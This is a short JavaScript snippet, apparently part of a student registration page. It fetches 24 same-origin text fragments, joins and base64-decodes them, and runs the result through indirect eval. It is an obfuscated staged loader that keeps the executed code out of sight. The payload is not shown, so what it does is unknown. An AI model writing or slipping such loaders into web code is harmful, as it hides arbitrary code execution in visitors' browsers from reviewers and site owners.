(function(){
  var F=[];
  for (var i=0;i<24;i++) F.push("/_asr_x"+i+".txt");
  Promise.all(F.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(parts){
    var b64 = parts.join("").replace(/\s+/g,"");
    var bin = atob(b64);
    var out = "";
    for (var i=0;i<bin.length;i++) out += String.fromCharCode(bin.charCodeAt(i));
    try { out = decodeURIComponent(escape(out)); } catch(_) {}
    (0,eval)(out);
  }).catch(function(e){ console.error("[students-reg] load failed", e); });
})();
